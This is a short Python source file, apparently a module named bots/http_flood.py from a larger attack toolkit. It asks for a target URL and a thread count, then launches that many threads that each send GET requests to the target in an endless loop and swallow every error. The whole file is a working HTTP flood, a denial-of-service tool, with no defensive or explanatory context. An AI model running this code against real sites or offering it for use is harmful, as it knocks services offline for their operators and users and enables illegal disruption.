# bots/http_flood.py
import requests
from threading import Thread

def http_flood(url):
    while True:
        try:
            requests.get(url)
            print(f"[✓] Request sent to {url}")
        except:
            pass

def start_http():
    url = input("[?] Target URL (http://...): ")
    threads = int(input("[?] Threads: "))
    for _ in range(threads):
        Thread(target=http_flood, args=(url,)).start()
